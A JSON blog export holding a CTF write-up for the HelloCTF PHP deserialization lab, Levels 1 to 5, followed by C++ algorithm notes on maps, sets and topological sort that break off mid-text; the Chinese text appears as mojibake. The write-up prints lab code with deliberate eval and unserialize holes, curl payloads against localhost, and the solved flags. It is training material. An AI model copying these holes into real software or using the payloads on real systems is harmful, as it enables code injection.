[{"title":"Hello CTF ä» 0 å¼€å§‹çš„PHPååºåˆ—åŒ–å…¥é—¨é¶åœº","url":"/2025/08/25/xue-xi/ctf/hello-ctf-cong-0-kai-shi-de-php-fan-xu-lie-hua-ru-men-ba-chang-writeup/","content":"# Hello CTF - ä» 0 å¼€å§‹çš„PHPååºåˆ—åŒ–å…¥é—¨é¶åœº writeup\nRepo: [github.com/ProbiusOfficial/PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)\nè®¨åŒ PHPâ€¦â€¦ä¸è¿‡ä¹Ÿæ˜¯åšä¸Šäº†æ¢å§¬è€å¸ˆå‡ºçš„é¢˜äº†ã€‚\n## éƒ¨ç½²\nç›´æ¥ docker éƒ¨ç½²ã€‚\n```bash\ndocker run -p 8081:80 -d ghcr.io/probiusofficial/phpserialize-labs\n```\n\nç›´æ¥è®¿é—® [localhost:8081](localhost:8081) å³å¯è¿›å…¥é¡µé¢ã€‚\n\n![image.png](https://s3.moyuin.top/blog-images/2025/08/25/68ac18778ad94.png)\n\n---\n## Level 1\n\n```php\n<?phpÂ /*  \n---Â HelloCTFÂ -Â ååºåˆ—åŒ–é¶åœºÂ å…³å¡Â 1Â :Â ç±»çš„å®ä¾‹åŒ–Â ---Â   \n  \nHINTï¼šå°å®ä¾‹åŒ–ä¸‹é¢çš„FLAGç±»å§ï¼  \n  \n#Â -*-Â coding:Â utf-8Â -*-  \n#Â @Author:Â æ¢å§¬  \n#Â @Date:Â Â Â 2024-07-01Â 20:30  \n#Â @Repo:Â Â Â github.com/ProbiusOfficial/PHPSerialize-labs  \n#Â @email:Â Â admin@hello-ctf.com  \n#Â @link:Â Â Â hello-ctf.com  \n  \n*/  \n  \n  \nclassÂ FLAG{  \nÂ Â Â Â publicÂ $flag_stringÂ =Â \"HelloCTF{ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ}\";  \n  \nÂ Â Â Â functionÂ __construct(){  \nÂ Â Â Â Â Â Â Â echoÂ $this->flag_string;  \nÂ Â Â Â }  \n}  \n  \n$codeÂ =Â $_POST['code'];  \n  \neval($code);\n```\n\n- å¤æ³• curl ç‚®åˆ¶ post è¯·æ±‚ï¼Œè®© `code=new FLAG();` ã€‚\n```shell\ncurl -X POST -d \"code=new FLAG();\" http://localhost:8081/Level1/index.php\n```\n\n- æˆ–è€…ä½¿ç”¨ burpsuite å‘é€ post è¯·æ±‚ï¼Œå°† GET æ”¹ä¸º POSTï¼Œåœ¨æœ€å body é‡Œæ·»åŠ  \n```php\ncode=new FLAG();\n```\n\t\n**å‘é€ POST è¯·æ±‚éœ€è¦å¸¦ header**ï¼š`Content-Type: application/x-www-form-urlencoded`\n\nå¾—åˆ° flag\n```text\nHelloCTF{OK_Now_y0u_c4n_se3_me}\n```\n\n---\n## Level 2\n```php\n`<?php      /*   \n---Â HelloCTFÂ -Â ååºåˆ—åŒ–é¶åœºÂ å…³å¡Â 2Â :Â ç±»å€¼çš„ä¼ é€’Â ---Â       \nHINTï¼šå°è¯•å°†flagä¼ é€’å‡ºæ¥~      \n#Â -*-Â coding:Â utf-8Â -*-   \n#Â @Author:Â æ¢å§¬   \n#Â @Date:Â Â Â 2024-07-01Â 20:30   #Â @Repo:Â Â Â github.com/ProbiusOfficial/PHPSerialize-labs   #Â @email:Â Â admin@hello-ctf.com   \n#Â @link:Â Â Â hello-ctf.com      */      \nerror_reporting(0);Â \n\n$flag_stringÂ =Â \"HelloCTF{ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ}\";   Â   \n Â \nclassÂ FLAG{   Â Â Â Â Â Â Â Â \n\tpublicÂ $free_flagÂ =Â \"???\";   \n\t   Â Â Â Â Â Â Â Â \n\tfunctionÂ get_free_flag(){   Â Â Â Â Â Â Â Â Â Â Â Â \n\t\techoÂ $this->free_flag;   Â Â Â Â Â Â Â Â \n\t}   Â Â Â Â \n}   \n$targetÂ =Â newÂ FLAG();      \n$codeÂ =Â $_POST['code'];      \nif(isset($code)){   Â Â Â Â Â Â Â \n\teval($code);Â Â Â Â Â Â Â \n\t$target->get_free_flag();   \n}   \nelse{Â Â Â Â \n\thighlight_file('source');   \n}   \n\t\n\tNow Flag is ???\n\n\n```\n\nä¸€æ ·æ˜¯å‘é€ POST è¯·æ±‚ï¼Œä½†æ˜¯è®¾å®šå¥½ code åç»™ target çš„ free_flag ä¿®æ”¹ä¸º\n`$flag_string` å³å¯ã€‚\n- å¯¹äº burpsuiteï¼Œå°† GET æ”¹ä¸º POST åï¼Œåœ¨æœ€å body æ·»åŠ ï¼š\n```php\ncode=new FLAG();\n$target->free_flag=$flag_string;\n```\n- å¯¹äº curlï¼Œcurl åœ¨ç»ˆç«¯å¯¹ `$` æœ‰ç‰¹æ®Šå¤„ç†ï¼Œéœ€è¦ä½¿ç”¨å•å¼•å·åŒ…è£¹è¯·æ±‚ã€‚\n  > `$` ç¬¦å·åœ¨ Linux/macOS çš„ç»ˆç«¯ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º Shellï¼Œä¾‹å¦‚ Bashã€Zshï¼‰é‡Œæ˜¯ä¸€ä¸ªæœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ã€‚å®ƒè¢«ç”¨æ¥**å¼•ç”¨å˜é‡**ã€‚\n  \n  \n```shell\ncurl -X POST -d 'code=new FLAG();\n$target->free_flag=$flag_string;' http://localhost:8081/Level2/index.php\n```\n```text\nNow Flag is HelloCTF{I_giv3_t0_y0u&y0u_giv3_t0_me}\n```\n\n---\n## Level 3\n```php\n<?php  \n  \n/*  \n---Â HelloCTFÂ -Â ååºåˆ—åŒ–é¶åœºÂ å…³å¡Â 3Â :Â å¯¹è±¡ä¸­å€¼çš„æƒé™Â ---Â   \n  \nHINTï¼šå°è¯•å°†flagä¼ é€’å‡ºæ¥~  \n  \n#Â -*-Â coding:Â utf-8Â -*-  \n#Â @Author:Â æ¢å§¬  \n#Â @Date:Â Â Â 2024-07-01Â 20:30  \n#Â @Repo:Â Â Â github.com/ProbiusOfficial/PHPSerialize-labs  \n#Â @email:Â Â admin@hello-ctf.com  \n#Â @link:Â Â Â hello-ctf.com  \n  \n*/  \n  \nclassÂ FLAG{  \nÂ Â Â Â publicÂ $public_flagÂ =Â \"HelloCTF{?\";  \nÂ Â Â Â protectedÂ $protected_flagÂ =Â \"?\";  \nÂ Â Â Â privateÂ $private_flagÂ =Â \"?}\";  \n  \nÂ Â Â Â functionÂ get_protected_flag(){  \nÂ Â Â Â Â Â Â Â returnÂ $this->protected_flag;  \nÂ Â Â Â }  \n  \nÂ Â Â Â functionÂ get_private_flag(){  \nÂ Â Â Â Â Â Â Â returnÂ $this->private_flag;  \nÂ Â Â Â }  \n}  \n  \nclassÂ SubFLAGÂ extendsÂ FLAG{  \nÂ Â Â Â functionÂ show_protected_flag(){  \nÂ Â Â Â Â Â Â Â returnÂ $this->protected_flag;  \nÂ Â Â Â }  \n  \nÂ Â Â Â functionÂ show_private_flag(){  \nÂ Â Â Â Â Â Â Â returnÂ $this->private_flag;  \nÂ Â Â Â }  \n}  \n  \n$targetÂ =Â newÂ FLAG();  \n$sub_targetÂ =Â newÂ SubFLAG();  \n  \n  \n$codeÂ =Â $_POST['code'];  \n  \nif(isset($code)){  \nÂ Â Â Â eval($code);  \n}Â elseÂ {Â Â Â Â highlight_file(__FILE__);  \nÂ Â Â Â echoÂ \"TryingÂ toÂ getÂ FLAG...<br>\";  \nÂ Â Â Â echoÂ \"PublicÂ Flag:Â \".$target->public_flag.\"<br>\";  \nÂ Â Â Â echoÂ \"ProtectedÂ Flag:\".$target->protected_flagÂ .\"<br>\";  \nÂ Â Â Â echoÂ \"PrivateÂ Flag:\".$target->private_flagÂ .\"<br>\";  \n}  \n  \n?>\nTrying to get FLAG...  \nPublic Flag: HelloCTF{se3_me_  \nProtected Flag: Error: Cannot access protected property FLAG:: in ?  \nPrivate Flag: Error: Cannot access private property FLAG:: in ?  \n...Wait,where is the flag?\n```\n\næ‹¼æ¥ flagï¼Œä¸€ä¸ªä¸€ä¸ªæ¥ã€‚\nPublic ç±»æ˜¯å¯ä»¥ç›´æ¥è¯»å–çš„ã€‚\nProtected æ˜¯å­ç±»å¯ä»¥è¯»å–çš„ï¼Œ`echo $sub_target->show_protected_flag();` å¯å¾—åˆ°ã€‚\nPrivate ç±»æ˜¯å­ç±»ä¹Ÿä¸å¯è¯»å–ï¼Œåªèƒ½é€šè¿‡ PHP ç‰¹æ€§è·å–ã€‚\n\nå¸¸ç”¨çš„æ–¹æ³•æ˜¯ï¼Œåœ¨PHP æœ‰ä¸€ä¸ªåå°„è¶Šæƒç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡æ„é€ åå°„ç±»ï¼Œåœ¨åå°„ç±»é‡Œé¢è®¾å®šè®¿é—®æƒé™ï¼Œä»è€Œè¯»å– private å†…å®¹ã€‚\n\n> PHP æä¾›äº†ä¸€æ•´å¥—å¼ºå¤§çš„â€œåå°„â€APIï¼Œå®ƒå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥è‡ªèº«çš„ç»“æ„ï¼ŒåŒ…æ‹¬ç±»ã€æ–¹æ³•ã€å±æ€§ç­‰ï¼Œç”šè‡³å¯ä»¥æ— è§† `private` å’Œ `protected` çš„é™åˆ¶ã€‚è¿™æ˜¯æœ€å¸¸ç”¨ã€æœ€æ­£è§„çš„â€œè¶Šæƒâ€æ–¹æ³•ã€‚\n> **æ ¸å¿ƒæ€æƒ³**ï¼š\n> 1. è·å–è¿™ä¸ªç±»çš„åå°„å®ä¾‹ (`ReflectionClass`)ã€‚\n> 2. ä»åå°„å®ä¾‹ä¸­è·å–ç§æœ‰å±æ€§çš„åå°„å®ä¾‹ (`ReflectionProperty`)ã€‚\n> 3. **ä½¿ç”¨ `setAccessible(true)` æ–¹æ³•ï¼Œå¼ºè¡Œå°†è¿™ä¸ªç§æœ‰å±æ€§è®¾ç½®ä¸ºâ€œå¯è®¿é—®â€**ã€‚\n> 4. è¯»å–å±æ€§çš„å€¼ã€‚\n\n```php\n// é¦–å…ˆå¿…é¡»æœ‰ä¸€ä¸ª FLAG ç±»çš„å…·ä½“å¯¹è±¡\n// è¿™ä¸ªå¯¹è±¡å·²ç»å­˜åœ¨äº†ï¼Œæ¯”å¦‚å« $target\n// å¦‚æœæ²¡æœ‰ï¼Œéœ€è¦è‡ªå·± new ä¸€ä¸ª\n\n// è·å– FLAG ç±»çš„åå°„\n$reflection = new ReflectionClass('FLAG');\n\n// è·å–ç§æœ‰å±æ€§ private_flag\n$property = $reflection->getProperty('private_flag');\n\n// è®¾ç½®å±æ€§ä¸ºå¯è®¿é—®\n$property->setAccessible(true);\n\n// ä»è¿™ä¸ªå®ä¾‹ä¸­è·å–å€¼ï¼Œè€Œä¸æ˜¯ä» $reflection ä¸­è·å–\n$secret_value = $property->getValue($target);\n\necho $secret_value;\n```\n\nä»è€Œæ„é€  POST çš„ payloadï¼š\n```php\ncode=new FLAG();\n\n\necho $target->public_flag;\necho $sub_target->show_protected_flag();\n\n$reflection = new ReflectionClass('FLAG');\n$property = $reflection->getProperty('private_flag');\n$property->setAccessible(true);\n$secret_value = $property->getValue($target);\necho $secret_value;\n```\næˆ–è€…å‘é€ curl è¯·æ±‚ï¼š\n```shell\ncurl -X POST -d 'code=new FLAG();echo $target->public_flag;echo $sub_target->show_protected_flag();$reflection = new ReflectionClass('FLAG');$property =$reflection->getProperty('private_flag');$property->setAccessible(true);$secret_value = $property->getValue($target);echo $secret_value;' http://localhost:8081/Level3/index.php\n```\n\n```text\nHelloCTF{se3_me_4nd_g3t_mmmme}\n```\n\n---\n## Level 4\n```php\n<?php  \n  \n/*  \n---Â HelloCTFÂ -Â ååºåˆ—åŒ–é¶åœºÂ å…³å¡Â 4Â :Â åºåˆ—åŒ–Â ---Â   \n  \nHINTï¼šå—¯ï¼ï¼Ÿå…¨æ˜¯ç§æœ‰ï¼Œæ€ä¹ˆè·å–flagå‘¢ï¼Ÿè¯•è¯•åºåˆ—åŒ–ï¼  \n  \n#Â -*-Â coding:Â utf-8Â -*-  \n#Â @Author:Â æ¢å§¬  \n#Â @Date:Â Â Â 2024-07-01Â 20:30  \n#Â @Repo:Â Â Â github.com/ProbiusOfficial/PHPSerialize-labs  \n#Â @email:Â Â admin@hello-ctf.com  \n#Â @link:Â Â Â hello-ctf.com  \n  \n*/  \n  \nclassÂ FLAG3{  \nÂ Â Â Â privateÂ $flag3_object_arrayÂ =Â array(\"ï¼Ÿ\",\"ï¼Ÿ\");  \n}  \n  \nclassÂ FLAG{  \nÂ Â Â Â Â privateÂ $flag1_stringÂ =Â \"ï¼Ÿ\";  \nÂ Â Â Â Â privateÂ $flag2_numberÂ =Â '?';  \nÂ Â Â Â Â privateÂ $flag3_object;  \n  \nÂ Â Â Â functionÂ __construct()Â {Â Â Â Â Â Â Â \nÂ Â Â Â Â $this->flag3_objectÂ =Â newÂ FLAG3();  \nÂ Â Â Â }  \n}  \n  \n$flag_is_hereÂ =Â newÂ FLAG();  \n  \n  \n$codeÂ =Â $_POST['code'];  \n  \nif(isset($code)){  \nÂ Â Â Â eval($code);  \n}Â elseÂ {Â Â Â Â \n\thighlight_file(__FILE__);  \n}\n```\nå…³äº PHP ååºåˆ—åŒ–çš„çŸ¥è¯†ï¼š\n>  **åºåˆ—åŒ– (`serialize`)**ï¼šå°†ä¸€ä¸ªå¯¹è±¡ï¼ˆæˆ–æ•°ç»„ç­‰ï¼‰çš„çŠ¶æ€ï¼Œè½¬æ¢æˆä¸€ä¸ªå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²ã€‚ \n>  **ååºåˆ—åŒ– (`unserialize`)**ï¼šè¯»å–åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å†…å­˜ä¸­é‡å»ºå‡ºåŸå§‹çš„å¯¹è±¡ã€‚\n\nåºåˆ—åŒ–ç¤ºä¾‹ï¼š\n```php\nclass SecretVault {\n    private $secret_key = \"CTF{...}\";\n    public $owner = \"Alice\";\n}\n\n$vault = new SecretVault();\n\n// æŠŠ $vault å¯¹è±¡åºåˆ—åŒ–\n$serialized_string = serialize($vault);\n\necho $serialized_string;\n```\nè¾“å‡ºçš„å­—ç¬¦ä¸²ä¼šæ˜¯è¿™æ ·çš„ï¼š \n```\nO:10: \"SecretVault\":2:{s:25: \" SecretVault secret_key\";s:9: \"CTF{...}\";s:5: \"owner\";s:5: \"Alice\";}\n```\nè¿™ä¸ªå­—ç¬¦ä¸²çœ‹èµ·æ¥å¤æ‚ï¼Œä½†å¾ˆæœ‰è§„å¾‹ï¼š\n- `O`: è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ (Object)ã€‚\n- `10`: è¡¨ç¤ºç±»åçš„é•¿åº¦æ˜¯ 10ä¸ªå­—ç¬¦ (`SecretVault`)ã€‚\n- `\"SecretVault\"`: ç±»åã€‚\n- `2`: è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡æœ‰ 2ä¸ªå±æ€§ã€‚\n- `{...}`: èŠ±æ‹¬å·é‡Œæ˜¯æ‰€æœ‰å±æ€§çš„æè¿°ã€‚\n- `s:5:\"owner\";s:5:\"Alice\";`: æè¿° `public` å±æ€§ `owner`ï¼Œ`s` ä»£è¡¨å­—ç¬¦ä¸²ï¼Œ`5` æ˜¯é•¿åº¦ã€‚\n- `s:25:\"\\0SecretVault\\0secret_key\";s:9:\"CTF{...}\";`: æè¿° `private` å±æ€§ `secret_key`ã€‚\n **è¿™é‡Œå‡ºç°äº†å¸¦ç©ºå­—èŠ‚çš„ç‰¹æ®Šé”®åï¼Œå¯åˆ©ç”¨åºåˆ—åŒ–å¤„ç†è·å– flag**ã€‚\n\nä¾èµ–è¿™ä¸ªåŸç†ï¼Œæ„é€ è¿™æ ·çš„ payloadï¼š\n```php\ncode=new FLAG();\necho serialize($flag_is_here);\n```\nå¾—åˆ°(åšä¸€ä¸‹åˆ‡åˆ†å¤„ç†ï¼Œå¤§æ‹¬å·æ‹†å¼€ï¼Œåˆ†å·éš”è¡Œ)ï¼š\n```\nO:4:\"FLAG\":3:\n{\ns:18:\"\u0000FLAG\u0000flag1_string\";\ns:8:\"ser4l1ze\";\ns:18:\"\u0000FLAG\u0000flag2_number\";\ni:2;\ns:18:\"\u0000FLAG\u0000flag3_object\";\nO:5:\"FLAG3\":1:{s:25:\"\u0000FLAG3\u0000flag3_object_array\";\na:2:{i:0;\ns:3:\"se3\";\ni:1;\ns:2:\"me\";}\n\t}\n}\n```\næŠŠ s å¼€å¤´ä¹Ÿå°±æ˜¯ string å…¨éƒ¨æå–å‡ºæ¥ï¼Œå¾—åˆ°ï¼š\n- Flag 1_string:  ser4l1ze, \n- Flag2_number:  2,\n- Flag3_object: se3, me\næ ¹æ®å‡ºç°é¡ºåºï¼Œå¾—åˆ° flagï¼ˆç”¨ä¸‹åˆ’çº¿è¿æ¥ï¼‰\n```text\nHelloCTF{ser4l1ze_2_se3_me}\n```\n\n---\n## Level 5\n```php\n<?php  \n  \n/*  \n---Â HelloCTFÂ -Â ååºåˆ—åŒ–é¶åœºÂ å…³å¡Â 5Â :Â åºåˆ—åŒ–è§„åˆ™Â ---Â   \n  \nHINTï¼šå„æœ‰åƒç§‹~  \n  \n#Â -*-Â coding:Â utf-8Â -*-  \n#Â @Author:Â æ¢å§¬  \n#Â @Date:Â Â Â 2024-07-01Â 20:30  \n#Â @Repo:Â Â Â github.com/ProbiusOfficial/PHPSerialize-labs  \n#Â @email:Â Â admin@hello-ctf.com  \n#Â @link:Â Â Â hello-ctf.com  \n  \n*/  \n  \nclassÂ a_class{  \nÂ Â Â Â publicÂ $a_valueÂ =Â \"HelloCTF\";  \n}  \n$a_objectÂ =Â newÂ a_class();  \n$a_arrayÂ =Â array(a=>\"Hello\",b=>\"CTF\");  \n$a_stringÂ =Â \"HelloCTF\";  \n$a_numberÂ =Â 678470;  \n$a_booleanÂ =Â true;  \n$a_nullÂ =Â null;\n\n/*See How to serialize:  \na_object: O:7:\"a_class\":1:{s:7:\"a_value\";s:8:\"HelloCTF\";}  \na_array: a:2:{s:1:\"a\";s:5:\"Hello\";s:1:\"b\";s:3:\"CTF\";}  \na_string: s:8:\"HelloCTF\";  \na_number: i:678470;  \na_boolean: ;  \na_null: N;  \nNow your turn!*/\n\n<?php  \n  \n$your_objectÂ =Â unserialize($_POST['o']);  \n$your_arrayÂ =Â unserialize($_POST['a']);  \n$your_stringÂ =Â unserialize($_POST['s']);  \n$your_numberÂ =Â unserialize($_POST['i']);  \n$your_booleanÂ =Â unserialize($_POST['b']);  \n$your_NULLÂ =Â unserialize($_POST['n']);  \n  \nif(Â Â Â Â \n\t$your_booleanÂ &&Â Â Â Â Â \n\t$your_NULLÂ ==Â nullÂ &&Â Â Â Â \n\t$your_stringÂ ==Â \"IWANT\"Â &&Â Â Â Â \n\t$your_numberÂ ==Â 1Â &&Â Â Â Â \n\t$your_object->a_valueÂ ==Â \"FLAG\"Â &&Â Â Â Â \n\t$your_array['a']Â ==Â \"Plz\"Â &&Â \n\t$your_array['b']Â ==Â \"Give_M3\"  \n){  \nÂ Â Â Â echoÂ $flag;  \n}  \nelse{  \nÂ Â Â Â echoÂ \"YouÂ reallyÂ knowÂ howÂ toÂ serialize?\";  \n}\n\n\n```\nç­”æ¡ˆéƒ½å·²ç»åœ¨æ˜é¢ä¸Šäº†ï½æˆ‘ä»¬ POST ä¸€ä¸ªåºåˆ—åŒ–ï¼Œä»¤å…¶ååºåˆ—åŒ–çš„æ•°æ®ç­‰äºé¢˜ç›®æ‰€éœ€å³å¯ã€‚\n\næ„é€  POST payloadï¼š\n```php\no=O:7:\"a_class\":1:{s:7:\"a_value\";s:4:\"FLAG\";}\n&a=a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}\n&s=s:5:\"IWANT\";\n&i=i:1;\n&b=b:1;\n&n=N;\n\n```\n\nå¾—åˆ°ï¼š\n```text\nHelloCTF{Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!}\n```\n\n---\næœªå®Œå¾…ç»­â€¦â€¦","tags":["å­¦ä¹ ","CTF","writeup"],"categories":["æ—¥å¸¸å­¦ä¹ ","CTFå­¦ä¹ "]},{"title":"ä¸€äº›ç®—æ³•ç¬”è®°","url":"/2025/07/01/xue-xi/suan-fa/yi-xie-suan-fa-bi-ji/","content":"# ä¸€äº›ç®—æ³•ç¬”è®°\nè®°å½•ä¸€äº›åšé¢˜ä¸­ä¸å¤ªçŸ¥é“çš„ï¼Œå…å¾—ä¸¢æ‰å°è±¡ã€‚\n## Enum class\n```cpp\nenum class Gesture\n{\n    C, // çŸ³å¤´\n    J, // å‰ªåˆ€\n    B  // å¸ƒ\n};\n```\n\nå¯¹äº `enum class` ç»“æ„ï¼Œè°ƒç”¨çš„æ—¶å€™å¾—ç”¨ `Gesture::C` è¿™ç§æ ¼å¼ã€‚\n\n## Map - low_bound\nåœ¨ `map` é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ `low_bound` å‡½æ•°ï¼Œåœ¨mapä¸­æŸ¥æ‰¾ç¬¬ä¸€ä¸ª**ä¸å°äº**ï¼ˆä¹Ÿå°±æ˜¯å¤§äºæˆ–ç­‰äºï¼‰ç»™å®šçš„ `key` çš„å…ƒç´ ã€‚\næ ¹æ®è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥å®ç°ä¸€ä¸ªåŒºé—´çš„æ˜ å°„å»ºç«‹\n```cpp\nstd::map<int, char> gradeMap = { \n {59, 'F'}, // 0-59åˆ† -> F\n {69, 'D'}, // 60-69åˆ† -> D \n {79, 'C'}, // 70-79åˆ† -> C \n {89, 'B'}, // 80-89åˆ† -> B \n {100, 'A'} // 90-100åˆ† -> A\n  };\n  \n  char getGradeFromMap(int score) {\n    // å¦‚æœåˆ†æ•°å°äº0æˆ–è€…å¤§äº100ï¼Œç›´æ¥è¿”å›æ— æ•ˆ\n    if (score < 0 || score > 100) {\n        return '?';\n    }\n\n    // æŸ¥æ‰¾ç¬¬ä¸€ä¸ªä¸å°äºscoreçš„é”®å€¼å¯¹\n    auto it = gradeMap.lower_bound(score);\n\n    // lower_bound æ‰¾åˆ°äº†ä¸€ä¸ªåˆæ³•çš„åŒºé—´ä¸Šé™\n    if (it != gradeMap.end()) {\n        // it->first æ˜¯ä¸Šé™åˆ†æ•°ï¼Œit->second æ˜¯å¯¹åº”çš„ç­‰çº§\n        return it->second;\n    }\n\n    // å¦‚æœæ²¡æ‰¾åˆ°ï¼ˆæ¯”å¦‚åˆ†æ•°å¤§äº100ï¼Œè™½ç„¶æˆ‘ä»¬å·²ç»å¤„ç†äº†ï¼‰ï¼Œåˆ™ä¸ºæ— æ•ˆ\n    return '?';\n}\n  \n```\n## Set\n`set` è°ƒç”¨çš„æ—¶å€™å¾—ç”¨ `auto`ï¼Œè¿­ä»£å™¨ã€‚\nç”¨ `insert` æ’å…¥å€¼ï¼Œè¿­ä»£å™¨è¾“å‡ºå€¼ï¼Œè¿­ä»£å™¨æ˜¯æŒ‡é’ˆï¼Œæ‰€ä»¥å¾— `*it` ç”¨æ¥è§£åº”ç”¨ã€‚\nè§ [week 2 12æ‹¼å†™æ£€æŸ¥](https://cg.hnu.edu.cn/assignment/programList.jsp?proNum=12&courseID=99&assignID=1362&libCenter=false)ã€‚\n```cpp\nset<ll>s;\n    for(ll i=0;i<n;i++){\n        ll x;\n        cin>>x;\n        s.insert(x);\n    }\n    ll count=0;\n    for(auto it=s.begin();it!=s.end()&&count<k;it++){\n        count++;\n        cout<<*it<<\" \";\n    }\n```\n\n## å¹¶è¡Œ\nå…ˆæŠŠâ€œå¹¶è¡Œâ€çš„æœ¬è´¨æƒ³æ¸…æ¥šï¼š**ä¸€ä¸ªä»»åŠ¡æœ€æ—©èƒ½å¼€å·¥çš„æ—¶é—´ = å®ƒæ‰€æœ‰å‰ç½®ä»»åŠ¡çš„â€œå®Œæˆæ—¶é—´â€çš„æœ€å¤§å€¼**ã€‚\n\næ‰€ä»¥ä½ ä¸éœ€è¦æ˜¾å¼â€œåˆå¹¶æ—¶é—´â€ï¼Œåªè¦ç»´æŠ¤â€œæœ€æ—©å¼€å§‹/å®Œæˆæ—¶é—´â€ï¼Œå¹¶åœ¨æ‹“æ‰‘åºé‡Œç”¨ max æ¨è¿›ï¼Œ**å¹¶è¡Œçš„æ•ˆæœè‡ªç„¶å‡ºç°**ã€‚\nè§ [luogu P1113](https://www.luogu.com.cn/problem/P1113)\n```cpp\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<string>\nusing namespace std;\n//ä¾æ¬¡è¯»å…¥æ¯ä¸ªæ‚åŠ¡çš„å·¥ä½œè¯´æ˜ã€‚è®¡ç®—å‡ºæ‰€æœ‰æ‚åŠ¡éƒ½è¢«å®Œæˆçš„æœ€çŸ­æ—¶é—´ã€‚\n// äº’ç›¸æ²¡æœ‰å…³ç³»çš„æ‚åŠ¡å¯ä»¥åŒæ—¶å·¥ä½œ\n// æœ‰äº›æ‚åŠ¡å¿…é¡»åœ¨å¦ä¸€äº›æ‚åŠ¡å®Œæˆçš„æƒ…å†µä¸‹æ‰èƒ½è¿›è¡Œã€‚\n// æœ‰éœ€è¦å®Œæˆçš„ n ä¸ªæ‚åŠ¡çš„æ¸…å•ï¼Œå¹¶ä¸”è¿™ä»½æ¸…å•æ˜¯æœ‰ä¸€å®šé¡ºåºçš„ï¼Œæ‚åŠ¡ k (k>1) çš„å‡†å¤‡å·¥ä½œåªå¯èƒ½åœ¨æ‚åŠ¡ 1 è‡³ kâˆ’1 ä¸­ã€‚\n// ä¸€é“æ‹“æ‰‘æ’åºé¢˜ï¼Œæ‰¾åˆ°æ‰€æœ‰å…¥åº¦ä¸º0çš„ç‚¹ï¼Œæ›´æ–°å…¶é‚»æ¥ç‚¹çš„å…¥åº¦ï¼Œç›´åˆ°æ‰€æœ‰ç‚¹éƒ½è¢«æ›´æ–°å®Œï¼Œä½†æ˜¯å¹¶è¡Œè®¡ç®—æ—¶é—´æ˜¯ä¸€ä¸ªéš¾ç‚¹â€¦â€¦\n// æœ‰äº›ä»»åŠ¡ä¸éœ€è¦ç¬¬äºŒä¸ªä»»åŠ¡å®Œæˆï¼Œä½†æ˜¯ä¸‹ä¸€ä¸ªä»»åŠ¡éœ€è¦ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå…±åŒå®Œæˆï¼Œä¸”ç¬¬äºŒä¸ªä»»åŠ¡å®Œæˆæ—¶é—´æ¯”ç¬¬ä¸‰ä¸ªçŸ­çš„è¯ï¼Œç‰¹æ®Šä»»åŠ¡ä¸èƒ½è®¡å…¥è®¡ç®—â€¦â€¦\n// éš¾ç‚¹æ˜¯æ‰¾åˆ°å¹¶è¡Œæ—¶é—´æœ€å¤§å€¼ã€‚\n\n  \n\nstruct task\n{\n\tint id;\n\tint time;\n\tvector<int>next;\n\tint inDegree=0;\n};\n\nint main(){\n\tint n;\n\tcin>>n;\n\tvector<task>tasks(n+1);\n\tfor(int i=1;i<=n;i++){\n\t\tint id,t;\t\n\t\tcin>>id>>t;\t\n\t\ttasks[id].id=id;\n\t\ttasks[id].time=t;\n\t\tint k=-1;\n\t\twhile(cin>>k,k!=0){\n\t\t\ttasks[k].next.push_back(id);\n\t\t\ttasks[id].inDegree++;\t\n\t\t}\n\n}\n\nvector<int>start(n+1,0); // æ¯ä¸ªä»»åŠ¡çš„æœ€æ—©å¼€å·¥æ—¶é—´ï¼Œæˆ‘è¯¥åšçº¿æ€§ç»Ÿè®¡è€Œéå½’å¹¶è®¡ç®—â€¦â€¦\nvector<int>end(n+1,0); // å®Œæˆæ¯ä¸ªä»»åŠ¡çš„æœ€æ—©æ—¶é—´\nfor(int i=1;i<=n;i++){\n\tif(tasks[i].inDegree==0){\n\t\tend[i]=start[i]+tasks[i].time;\n\tfor(int v:tasks[i].next){\n\t\tstart[v]=max(start[v],end[i]);\n\t\ttasks[v].inDegree--;\n\t}\n//å½“å…¥åº¦ä¸º0ï¼Œå¯ä»¥å’Œç°æœ‰çº¿æ€§æ—¶é—´çš„æ ‡è®°ç»ˆæ­¢æ—¶é—´åšæ¯”è¾ƒäº†â€¦â€¦\n\t}\n}\n\n//æœ€åç»ˆæ­¢çš„æ—¶é—´å°±æ˜¯æœ€çŸ­æ—¶é—´ã€‚æŠŠæ—¶é—´å½“ä½œçº¿æ€§çœ‹å¾…æ˜¯å…³é”®ã€‚\ncout<<*max_element(end.begin(),end.end())<<endl;\nreturn 0;\n}\n```\n## Kahn æ‹“æ‰‘æ’åº\n\n### **ğŸŸ¢ æ¨¡æ¿ 1ï¼šå›ºå®šæºç‚¹ + å·²çŸ¥**Â **u < v**\n\n> ï¼ˆæ¯”å¦‚æ´›è°· [ P1807](https://www.luogu.com.cn/problem/P1807)ï¼Œä¿è¯è¾“å…¥è¾¹æ»¡è¶³ u < vï¼‰\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\ndist[src] = 0;\n\nfor (int u = 1; u <= n; ++u) {\n    if (dist[u] == NEG) continue; // ä¸å¯è¾¾è·³è¿‡\n    for (auto [v, w] : adj[u]) {\n        dist[v] = max(dist[v], dist[u] + w);\n    }\n}\n```\n\n- **é€‚ç”¨**ï¼šé¢˜é¢ä¿è¯ u < vï¼Œç¼–å·å°±æ˜¯æ‹“æ‰‘åºã€‚\n- **ç»“æœ**ï¼š`dist[v]` æ˜¯ä»æºç‚¹å‡ºå‘åˆ° v çš„æœ€é•¿è·¯ã€‚\n    